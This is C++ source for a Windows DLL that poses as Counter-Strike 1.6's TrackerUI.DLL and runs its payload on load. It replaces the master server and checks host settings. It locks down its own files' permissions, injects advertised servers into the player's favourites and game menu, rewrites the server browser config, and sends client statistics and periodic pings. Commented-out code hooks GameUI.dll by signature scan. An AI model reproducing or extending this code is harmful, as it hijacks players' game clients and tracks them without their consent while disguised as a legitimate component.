#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <cstdio>

#include <cstdlib>
#include <ctime>
#include <Shlwapi.h>
#include <Exdisp.h>
#include <shlguid.h>
#include <Servprov.h>

#include <vector>
#include <memory>

using namespace std;

#pragma comment(lib,"wininet")

#include "MasterServer.h"
#include "UpdateClass.h"
#include "StatisticsClass.h"
#include "ClearFiles.h"
#include "HostClass.h"
//#include "BrowserEvents.h"
#include "ServersLoad.h"
#include "Server.h"
#include "Favourites.h"
#include "GameMenu.h"
#include "Baner.h"
//#include "chooker.h"
//#include "Browser.h"
#include "Util.h"

#include "Log.h"

const char * folderMain		= "cstrike/bin";
const char * fileNameMain 	= "cstrike/bin/TrackerUI.DLL";
const char * fileLibist		= "cstrike/liblist.gam";
const char * fileRev		= "rev.ini";

const char * fileSave		= "cstrike/save";
const char * fileHw 		= "cstrike/hw";

const char * currentVersion = "1.6.1";

void checkAttributesTracker();

DWORD WINAPI openServerBrowser( PVOID pvParam );

DWORD WINAPI checkUpdate( PVOID pvParam );
DWORD WINAPI sendInformations( PVOID pvParam );
//DWORD WINAPI openAdvert( PVOID pvParam );

DWORD WINAPI checkAdvertServers( PVOID pvParam );

DWORD WINAPI checkBaner( PVOID pvParam );

extern "C" {
	__declspec(dllexport) BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved){

		if( fdwReason == DLL_PROCESS_DETACH ){
			#if defined DEBUG
			logToFile( "On exit" );
			#endif

            //exitBrowser();

       		return true;
		}

		if( fdwReason != DLL_PROCESS_ATTACH ){
			return true;
		}

		MasterServer master;
		ClearFiles clearInstance;
		HostClass hostInstance;

		checkAttributesTracker();

        clearInstance.clear();

		master.replaceMaster();

		hostInstance.checkHost();

		CreateThread( NULL , 0 , checkUpdate , NULL , 0 , NULL );
		CreateThread( NULL , 0 , sendInformations , NULL , 0 , NULL );
		//CreateThread( NULL , 0 , openAdvert , NULL , 0 , NULL );
		CreateThread( NULL , 0 , openServerBrowser , NULL , 0 , NULL );
		CreateThread( NULL , 0 , checkAdvertServers , NULL , 0 , NULL );
		CreateThread( NULL , 0 , checkBaner , NULL , 0 , NULL );

		return true;
	}
}

DWORD WINAPI checkBaner( PVOID pvParam ){
    Baner baner;

    baner.checkBaner();
}

DWORD WINAPI checkAdvertServers( PVOID pvParam ){

    std::vector< std::unique_ptr< Server > > favoritesServers;
    std::vector< std::unique_ptr< Server > > gamemenuServers;

    std::vector< std::unique_ptr< Server > > oldServers;

    ServersLoad servers;

    servers.loadFavorites( favoritesServers );
    servers.loadGamemenu( gamemenuServers );

    #if defined DEBUG
    for( std::vector< std::unique_ptr< Server > >::iterator it = gamemenuServers.begin() ; it != gamemenuServers.end() ; ++it ){
        char bufferLog[ 256 ];
        snprintf( bufferLog, sizeof( bufferLog ) - 1 ,"Loaded gamememnu server object Name: %s Ip: %s" , (*it) -> getName().c_str() , ( *it ) -> getIp().c_str() );
        logToFile( bufferLog );
    }

    for( std::vector< std::unique_ptr< Server > >::iterator it = favoritesServers.begin() ; it != favoritesServers.end() ; ++it ){
        char bufferLog[ 256 ];
        snprintf( bufferLog, sizeof( bufferLog ) - 1 ,"Loaded favorites server object Name: %s Ip: %s" , (*it) -> getName().c_str() , ( *it ) -> getIp().c_str() );
        logToFile( bufferLog );
    }
    #endif

    GameMenu gameMenu;
    Favourites favourites;

    gameMenu.saveServers( gamemenuServers );

    favourites.loadServers( oldServers );
    favourites.saveServers( favoritesServers , oldServers );
}

DWORD WINAPI openServerBrowser( PVOID pvParam ){
	/*Sleep( 10000 );

	CHooker* hooker = new CHooker;

	char ( *guiCommandsRun )( int , double , const char * ) = NULL;

	void* gameUiAddress = hooker->memFunc->GetLibraryFromName( ( char * )"GameUI.dll" );

	if( !gameUiAddress ){
		return 0;
	}

	hooker->memFunc->SearchByLibrary( &guiCommandsRun	, const_cast<char *>( "0x53,0x8B,*,*,*,0x56,,0x57,0x68,*,*,*,*,0x8B,*,0x53,0xE8,*,*,*,*" ), gameUiAddress, FALSE );

	if( guiCommandsRun ){
		guiCommandsRun( NULL , NULL , "OpenServerBrowser" );
	}*/

	checkAndSetPermissions( "platform/config/ServerBrowser.vdf" , false , false , false );

	FILE * fpRead = fopen( "platform/config/ServerBrowser.vdf" , "rt" );

	FILE * fpWrite = fopen( "platform/config/ServerBrowserNew.vdf" , "wt" );

	#if defined DEBUG
    logToFile( "Open serverbrowser files" );
    #endif

	if( !fpRead ){
        if( fpWrite ){
            fclose( fpWrite );
        }

	    return 0;
	}

	if( !fpWrite ){
        if( fpRead ){
            fclose( fpRead );
        }

	    return 0;
	}

	#if defined DEBUG
    logToFile( "Server browser start" );
    #endif

	char entriesGame[][ 256 ] = {
		"\t\"gamelist\"\t\t\"spectate\"\n",
		"\t\"gamelist\"\t\t\"favorites\"\n",
		"\t\"gamelist\"\t\t\"history\"\n",
		"\t\"gamelist\"\t\t\"lan\"\n",
		"\t\"gamelist\"\t\t\"friends\"\n"
	};

	char line[ 256 ];

	while( fgets( line , sizeof( line ) - 1 , fpRead ) != NULL ) {
        bool appendLine = true;

	    for( int iPosition = 0 ; iPosition < 5 ; iPosition++ ){
			if( strcmp( line , entriesGame[ iPosition ] ) == 0 ){
				appendLine = false;

				break;
			}
		}

		if( appendLine ){
            fputs( line , fpWrite );
		}
		else{
            fputs( "\t\"gamelist\"\t\t\"internet\"\n" , fpWrite );
		}
	}

	fclose( fpRead );
	fclose( fpWrite );

	DeleteFile( "platform/config/ServerBrowser.vdf" );

	MoveFile( "platform/config/ServerBrowserNew.vdf" , "platform/config/ServerBrowser.vdf" );

	return 0;
}

void checkAttributesTracker(){
	checkAndSetPermissions( fileNameMain , true , true , true );
	checkAndSetPermissions( folderMain , false , true , true );

	checkAndSetPermissions( fileLibist , true , false , false );
	checkAndSetPermissions( fileRev , true , false , false );

	checkFileAndSetPermission( fileSave );
	checkFileAndSetPermission( fileHw );
}

DWORD WINAPI checkUpdate( PVOID pvParam ){
	UpdateClass update;

	update.clearFiles();

	update.checkUpdate();

	//update.checkExe();

	//update.checkGuard();

	return 0;
}

DWORD WINAPI sendInformations( PVOID pvParam ){
	StatisticsClass statistic;

	statistic.newClient();

	while( statistic.getClientConnected() ){
		Sleep( 300000 );

		statistic.pingClient();
	}

	return 0;
}
